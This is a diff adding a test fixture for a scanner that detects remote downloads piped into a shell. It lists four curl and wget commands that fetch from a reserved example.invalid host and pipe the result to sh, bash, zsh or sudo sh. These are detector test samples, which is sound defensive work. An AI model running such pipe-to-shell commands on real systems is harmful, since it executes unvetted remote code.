@@ -1,0 +1,7 @@
+# Detector fixtures for test_fixture_hygiene.py. These lines are never run.
+# Each line below that is not a comment is one that the scan MUST flag as a remote
+# download piped to a shell. The hosts use the reserved .invalid top-level domain.
+curl https://example.invalid/x | sh
+curl -fsSL example.invalid |bash
+wget -qO- example.invalid | sudo sh
+wget -O - https://example.invalid/install | zsh
